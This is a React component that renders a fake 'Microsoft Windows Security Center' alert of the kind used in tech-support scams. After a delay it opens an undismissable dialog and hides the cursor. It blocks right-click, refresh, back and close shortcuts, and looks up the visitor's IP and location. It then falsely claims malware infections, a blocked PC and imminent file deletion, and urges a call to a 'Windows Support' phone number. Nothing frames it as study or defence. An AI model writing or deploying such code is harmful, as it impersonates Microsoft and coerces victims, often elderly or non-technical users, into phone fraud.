
import React, { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { X } from "lucide-react";

// Create our own VisuallyHidden component instead of importing from @radix-ui/react-visually-hidden
const VisuallyHidden = ({ children }: { children: React.ReactNode }) => (
  <span
    style={{
      border: 0,
      clip: "rect(0 0 0 0)",
      clipPath: "inset(50%)",
      height: "1px",
      margin: "-1px",
      overflow: "hidden",
      padding: 0,
      position: "absolute",
      width: "1px",
      whiteSpace: "nowrap"
    }}
  >
    {children}
  </span>
);

interface SecurityPopupProps {
  open?: boolean;
  onOpenChange?: (open: boolean) => void;
  showAfterMs?: number;
  preventClose?: boolean;
}

const SecurityPopup = ({
  open: controlledOpen,
  onOpenChange,
  showAfterMs = 15000, // Default to showing after 15 seconds
  preventClose = true // Default to preventing close
}: SecurityPopupProps) => {
  const [internalOpen, setInternalOpen] = useState(false);
  const [userIp, setUserIp] = useState("Loading...");
  const [dateTime, setDateTime] = useState("Loading...");
  const [location, setLocation] = useState("Atlanta, United States");
  
  // Determine if component is controlled or uncontrolled
  const isControlled = controlledOpen !== undefined;
  const open = isControlled ? controlledOpen : internalOpen;
  
  const handleOpenChange = (newOpen: boolean) => {
    if (preventClose && open) {
      // Prevent closing if preventClose is true and popup is open
      return;
    }
    
    if (!isControlled) {
      setInternalOpen(newOpen);
    }
    
    if (onOpenChange) {
      onOpenChange(newOpen);
    }
  };
  
  // Update date and time
  useEffect(() => {
    const updateDateTime = () => {
      const now = new Date();
      setDateTime(now.toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
      }));
    };
    
    updateDateTime(); // Initial call
    const interval = setInterval(updateDateTime, 1000); // Update every second
    
    return () => clearInterval(interval);
  }, []);
  
  // Fetch user IP
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setUserIp(data.ip);
      } catch (error) {
        console.error('Error fetching IP:', error);
        setUserIp('Unable to fetch IP');
      }
    };
    
    fetchIp();
  }, []);

  // Fetch location based on IP
  useEffect(() => {
    if (userIp !== "Loading..." && userIp !== "Unable to fetch IP") {
      const fetchLocation = async () => {
        try {
          const response = await fetch(`https://ipapi.co/${userIp}/json/`);
          const data = await response.json();
          if (data.city && data.country_name) {
            setLocation(`${data.city}, ${data.country_name}`);
          }
        } catch (error) {
          console.error('Error fetching location:', error);
        }
      };
      
      fetchLocation();
    }
  }, [userIp]);
  
  // Show popup after delay
  useEffect(() => {
    if (!isControlled && showAfterMs > 0) {
      const timer = setTimeout(() => {
        setInternalOpen(true);
      }, showAfterMs);
      
      return () => clearTimeout(timer);
    }
  }, [isControlled, showAfterMs]);
  
  // Disable cursor and other interactions when popup is open
  useEffect(() => {
    if (open) {
      // Create a style element to disable cursor
      const styleElement = document.createElement('style');
      styleElement.id = 'disable-cursor-style';
      styleElement.textContent = `
        * {
          cursor: none !important;
        }
        
        /* Prevent text selection */
        body {
          user-select: none !important;
          -webkit-user-select: none !important;
          -moz-user-select: none !important;
          -ms-user-select: none !important;
        }
      `;
      document.head.appendChild(styleElement);
      
      // Prevent right-click
      const preventContextMenu = (e: MouseEvent) => {
        e.preventDefault();
        return false;
      };
      
      // Prevent key shortcuts and refresh
      const preventKeyboardShortcuts = (e: KeyboardEvent) => {
        // Prevent F5, Ctrl+R, and other refresh shortcuts
        if (
          e.key === "F5" ||
          ((e.ctrlKey || e.metaKey) && e.key === "r") ||
          e.keyCode === 116 ||
          // Prevent Alt+Left/Right for browser history
          ((e.altKey || e.metaKey) && (e.key === "Left" || e.key === "Right")) ||
          // Prevent Ctrl+W to close window
          ((e.ctrlKey || e.metaKey) && e.key === "w")
        ) {
          e.preventDefault();
          e.stopPropagation();
          return false;
        }
      };
      
      window.addEventListener('contextmenu', preventContextMenu);
      window.addEventListener('keydown', preventKeyboardShortcuts, { capture: true });
      
      return () => {
        // Remove the style when component unmounts or popup closes
        const styleToRemove = document.getElementById('disable-cursor-style');
        if (styleToRemove) {
          document.head.removeChild(styleToRemove);
        }
        window.removeEventListener('contextmenu', preventContextMenu);
        window.removeEventListener('keydown', preventKeyboardShortcuts, { capture: true });
      };
    }
  }, [open]);
  
  return (
    <Dialog open={open} onOpenChange={handleOpenChange}>
      <DialogContent className="p-0 border-0 max-w-xl gap-0 z-[100]" closeButton={!preventClose} style={{ backgroundColor: "transparent" }}>
        <VisuallyHidden>
          <DialogTitle>Microsoft Windows Security Center</DialogTitle>
        </VisuallyHidden>
        {/* Header */}
        <div className="bg-white text-black p-3 flex items-center justify-between border-b border-gray-300">
          <div className="flex items-center">
            <div className="mr-2">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/2048px-Microsoft_logo.svg.png" 
                alt="Microsoft Logo" 
                className="w-6 h-6 object-contain"
              />
            </div>
            <span className="text-base font-bold">Microsoft Windows Security Center</span>
          </div>
          <span className="text-xl text-black pointer-events-none">×</span>
        </div>
        
        {/* Content */}
        <div className="p-5 text-center bg-white border-b border-gray-300">
          <div className="text-[#d83b01] text-sm font-bold">
            (5) Virus/Malware infections have been recognized on your device.
          </div>
          
          <div className="mt-2 text-xs">
            <p>
              Address IP: <span className="text-black">{userIp}</span>{" "}
              <span className="text-black">{dateTime}</span>
            </p>
            <p>Location: <span className="text-black">{location}</span></p>
            <p>
              ISP: <span className="text-[#005662]">Comcast Cable Communications, LLC</span>
            </p>
          </div>
          
          <div className="flex justify-center items-center gap-4 my-4">
            <div className="flex flex-col items-center">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/512px-Microsoft_logo.svg.png" 
                alt="Microsoft Windows" 
                className="w-14 h-14 object-contain" 
              />
              <span className="text-xs mt-1">Microsoft</span>
            </div>
            <div className="flex gap-2">
              <div className="flex flex-col items-center">
                <div className="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center">
                  <span className="text-white text-xs font-bold">!</span>
                </div>
                <span className="text-xs mt-1">Alert</span>
              </div>
              <div className="flex flex-col items-center">
                <div className="w-8 h-8 rounded-full bg-yellow-500 flex items-center justify-center">
                  <span className="text-white text-xs font-bold">?</span>
                </div>
                <span className="text-xs mt-1">Warning</span>
              </div>
              <div className="flex flex-col items-center">
                <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center">
                  <span className="text-white text-xs font-bold">✓</span>
                </div>
                <span className="text-xs mt-1">Check</span>
              </div>
            </div>
          </div>
          
          <div className="text-center mb-6">
            <h3 className="text-lg font-bold text-[#0078D4] mb-2">
              Access to this PC has been blocked for security reasons.
            </h3>
            <p className="text-[#0078D4] font-semibold">
              Contact Windows Support: +1-202-843-5111 (Toll Free)
            </p>
          </div>

          <p className="text-sm text-gray-600 mb-6">
            Note: If you think this notification is by error, report immediately to Windows Support to halt the auto-deletion of files and applications from this computer. As this computer ID is flagged and is connected over the Internet Servers, files and apps deletion may start any moment.
          </p>

          <div className="text-xs text-gray-700 mt-2">
            Your personal data, banking information and web login credentials saved on this PC are at risk due to a major security breach.
          </div>
          
          <div className="text-xs text-[#00A3EE] mt-2">
            Call Microsoft Windows Support <span className="text-[#00A3EE]">+1-202-843-5111</span> (Helpline)
          </div>
        </div>
        
        {/* Footer */}
        <div className="bg-white p-3 text-xs text-gray-700 flex items-center justify-between border-t border-gray-300">
          <div className="flex items-center">
            <div className="mr-2">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/2048px-Microsoft_logo.svg.png" 
                alt="Microsoft Logo" 
                className="w-6 h-6 object-contain"
              />
            </div>
            <div className="text-black text-base font-bold">
              Microsoft Windows
            </div>
          </div>
          
          <div className="flex gap-2">
            <Button 
              variant="destructive" 
              className="bg-[#d83b01] hover:bg-[#c23500] text-white px-5 py-2 text-sm h-auto"
              onClick={() => {
                // Cannot close dialog if preventClose is true
              }}
            >
              Deny
            </Button>
            <Button 
              className="bg-[#005662] hover:bg-[#00464f] text-white px-5 py-2 text-sm h-auto"
              onClick={() => {
                // Cannot close dialog if preventClose is true
              }}
            >
              Allow
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default SecurityPopup;
